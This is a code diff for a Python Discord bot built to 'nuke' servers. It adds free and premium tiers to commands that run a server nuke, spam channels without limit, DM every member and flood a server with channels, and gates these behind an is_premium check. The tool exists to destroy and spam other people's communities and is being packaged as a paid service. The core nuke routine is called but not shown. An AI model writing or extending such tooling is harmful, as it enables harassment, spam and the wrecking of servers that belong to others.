@@ -119,13 +119,20 @@ async def on_ready():
 
 # --- Slash Commands ---
 
-@client.tree.command(name="nuke", description="Full server nuke")
-@app_commands.describe(message="Custom spam message (optional)")
-async def nuke_slash(interaction: discord.Interaction, message: str = None):
+@client.tree.command(name="nuke", description="Full server nuke (Free - uses default message)")
+async def nuke_slash(interaction: discord.Interaction):
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
+    await nuke_guild(interaction.guild)
+
+@client.tree.command(name="custom_nuke", description="Full server nuke with custom message (Premium)")
+@app_commands.describe(message="Custom spam message")
+async def custom_nuke_slash(interaction: discord.Interaction, message: str):
+    if not is_premium(interaction.user.id):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🚀 Custom Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild, message)
 
-@client.tree.command(name="spam", description="Spam current channel")
+@client.tree.command(name="spam", description="Spam current channel (Premium)")
 @app_commands.describe(message="Message to spam", amount="How many times (blank for infinite)")
 async def spam_slash(interaction: discord.Interaction, message: str, amount: int = None):
     if not is_premium(interaction.user.id):
@@ -133,7 +140,7 @@ async def spam_slash(interaction: discord.Interaction, message: str, amount: int
     await interaction.response.send_message("💥 Spam Started!", ephemeral=True)
     asyncio.create_task(spam_task(interaction.channel, message, amount))
 
-@client.tree.command(name="massdm", description="DM all members")
+@client.tree.command(name="massdm", description="DM all members (Premium)")
 @app_commands.describe(message="Message to send")
 async def massdm_slash(interaction: discord.Interaction, message: str):
     if not is_premium(interaction.user.id):
@@ -144,7 +151,7 @@ async def massdm_slash(interaction: discord.Interaction, message: str):
             try: await member.send(message)
             except: continue
 
-@client.tree.command(name="flood", description="Flood with channels")
+@client.tree.command(name="flood", description="Flood with channels (Premium)")
 @app_commands.describe(name="Channel names", amount="Amount (max 100)")
 async def flood_slash(interaction: discord.Interaction, name: str, amount: int = 50):
     if not is_premium(interaction.user.id):
@@ -161,9 +168,18 @@ async def add_premium_slash(interaction: discord.Interaction, user: discord.User
     add_premium(user.id)
     await interaction.response.send_message(f"✅ {user.name} is now Premium!", ephemeral=True)
 
+# --- Prefix Commands ---
+
 @client.command()
-async def nuke(ctx, *, message: str = None):
+async def nuke(ctx):
     print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
+    await nuke_guild(ctx.guild)
+
+@client.command()
+async def custom_nuke(ctx, *, message: str):
+    if not is_premium(ctx.author.id):
+        return await ctx.send("❌ Premium Only!")
+    print(f'{y}[!] Custom Nuke command executed in {ctx.guild.name} by {ctx.author}')
     await nuke_guild(ctx.guild, message)
 
 @client.command()
